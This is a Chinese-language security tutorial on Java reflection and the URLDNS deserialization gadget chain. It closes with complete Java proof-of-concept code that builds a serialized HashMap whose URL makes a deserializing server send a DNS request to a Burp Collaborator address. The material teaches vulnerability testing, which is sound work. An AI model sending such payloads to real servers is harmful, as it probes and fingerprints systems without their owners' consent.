反射和URL链



1
反射


    在了解URL链之前，我们需要格外关注的是类的反射问题


    反射是可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。本质上其实就是动态的生成类似于上述的字节码，加载到JVM中运行

    

    举个例子通过观察人类中的单一个体，研究他的外貌特征到DNA的组成后，可以通过这一人类的单一个体创造出克隆人，并且可以对克隆的族群进行修改

反射例子


从上一篇“人”类开始进行反射操作

在主函数中实例化一个张三对象（Zhang_San）之后通过

       Class c = Zhang_San.getClass();
        System.out.println(c);

可以输出张三所属的类也就是人类（Human）

public class Main {    public static void main(String[] args) throws Exception {        Human Zhang_San = new Human("black","black",180);        //Zhang_San.print();        Class c = Zhang_San.getClass();        System.out.println(c);        //serializeHuman();        //UnserializeHuman();    }

每一个类都有一个Class对象，每当编译一个新类就产生一个Class对象，基本类型 (boolean, byte, char, short, int, long, float, and double)有Class对象，数组有Class对象，就连关键字void也有Class对象（void.class）。Class对象对应着java.lang.Class类，如果说类是对象抽象和集合的话，那么Class类就是对类的抽象和集合。


这里的class我们可以理解为类对应的的一个集合或者说是原型，而反射就是操作Class进行从原型实例化对象，获取类的属性调用类的方法。

通过原型Class实例化

import java.lang.reflect.Constructor;
public class Main {    public static void main(String[] args) throws Exception {        Human Zhang_San = new Human("black","black",180);        Class c = Zhang_San.getClass();        Constructor f = c.getConstructor(String.class,String.class,int.class);        Human Li_Si = (Human) f.newInstance("red","black",175);        Li_Si.print();    }

由于Class 下的newInstance()【实例化】是没有参数的，所以我们需要通过getConstructor方法让来获取一个构造的规范，也就是规定了传入几个参数和参数的类型，最后通过构造器和原型共同进行实例化。


通过反射查看和修改类的属性

import java.lang.reflect.Constructor;import java.lang.reflect.Field;

public class Main {    public static void main(String[] args) throws Exception {        Human Zhang_San = new Human("black","black",180);        Class c = Zhang_San.getClass();        Constructor f = c.getConstructor(String.class,String.class,int.class);        Human Li_Si = (Human) f.newInstance("red","black",175);        Li_Si.print();        Field[] field = c.getDeclaredFields();        for(Field e:field)        {            System.out.println(e);        }    }

通过调用Field[]类型和Class下的getDeclaredFields()方法可以得到具体的Human类型



public class Main {    public static void main(String[] args) throws Exception {        Human Zhang_San = new Human();        Class c = Zhang_San.getClass();        Constructor f = c.getConstructor(String.class,String.class,int.class);        Human Li_Si = (Human) f.newInstance("red","black",175);        Li_Si.print();        Field changeField = c.getDeclaredField("eye");        changeField.setAccessible(true);        changeField.set(Li_Si,"yellow");        Li_Si.print();

    }


通过

Field changeField = c.getDeclaredField("eye")

指定修改的成员


然后通过

changeField.setAccessible(true);

标识出可以修改私有和保护的成员

changeField.set(Li_Si,"yellow");

标识出修改的对象和参数

URL-Hashcode()


现在回归正题，我们今天的反序列化应用，我们说构成一个反序列化的漏洞主要的条件是

  1. 目标类继承了Serializable

  2. 拥有一个入口类类似于重写readObject包括有一个常见的函数（toString()HashCode().....)

  3. 调用链

  4. 执行（我们可以构造RCE）


今天训练营带大家通过URL类进行分析和研究


首先我们可以再IDEA中写一个URL然后右键查看声明。

可以发现URL类继承了Serializable


然后找到hashCode()函数，由于hashCode()函数属于一个常见的函数所以我们很有可能把它作为一个反序列化的利用点

可以发现

handler.hashCode(this);

调用了handler下的hashCode方法我们再转到handler下的hashCode的声明。

通过

InetAddress addr = getHostAddress(u);if (addr != null) {    h += addr.hashCode();

可以发现如果我们调用了URL下的hashCode那么会启用getHostAddress。那么我们从何处入手呢，可以检查一下Hashmap这个类的声明，发现

Hashmap下重写了readObject

我们往下看在readObject中调用了一个hash方法我们再转到其声明发现在hash方法中调用了hashcode()这样对于我们来说URL-HashMap这样的链就可以连起来用了

首先对HashMap实例化一个对象，然后赋值传参进一个URL，通过转到URL类的构造函数声明中可以发现只需要一个发起DNS请求的地址就可以了，那么我们可以使用BP来生成一段接收DNS请求的地址

import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.net.URL;import java.util.HashMap;

public class Test_URLDNS {    public static void serialize(Object obb) throws IOException{        ObjectOutputStream ous = new ObjectOutputStream(new FileOutputStream("print.bin"));        ous.writeObject(obb);    }
    public static void main(String[] args) throws Exception{        HashMap<URL, Integer> enter = new HashMap<>();        enter.put(new URL("http://569tidxsd86g8oe6eggaydn4avgl4a.burpcollaborator.net"),4);        serialize(enter);

    }
}

打开BP右上角Burp->Burp Collaborator client然后点击Copy to clipboard

但是这里有个问题，仅仅通过序列化之后程序就对我们的地址发出了DNS请求，这样是不行的，因为序列化可以在本地执行，那么我如果要攻击别人的服务器那么必须要让目标服务器进行反序列化，通过研究声明发现

public synchronized int hashCode() {    if (hashCode != -1)        return hashCode;
    hashCode = handler.hashCode(this);    return hashCode;
}

当hashCode不为-1的时候会返回hashCode不会再进行下面的操作那么hashCode在初始化的时候赋值为-1

经过初始化之后我们的hashCode显然已经不为-1了

所以这里我们就需要通过反射对hashcode进行修改，即完成操作之后hashcode依旧等于-1


经过修改的payload

import com.sun.xml.internal.ws.policy.privateutil.PolicyUtils;

import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;

public class Test_URLDNS {    public static void serialize(Object obb) throws IOException{        ObjectOutputStream ous = new ObjectOutputStream(new FileOutputStream("print.bin"));        ous.writeObject(obb);    }
    public static void main(String[] args) throws Exception{        HashMap<URL, Integer> enter = new HashMap<>();        URL url = new URL("http://vfemw2uy3n39spyo1a0eb1iz7qdg15.burpcollaborator.net");        Class c = url.getClass();        Field hashcodechange = c.getDeclaredField("hashCode");        hashcodechange.setAccessible(true);        hashcodechange.set(url,1);//修改hashCode不让使用调用put时发起请求        enter.put(url,342);        hashcodechange.set(url,-1);//这是把hashCode修改为-1        serialize(enter);        Unserialize("print.bin");//这是把反序列化    }
    public static Object Unserialize(String f) throws IOException, ClassNotFoundException {        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(f));        Object ooj = ois.readObject();        return ooj;    }
}
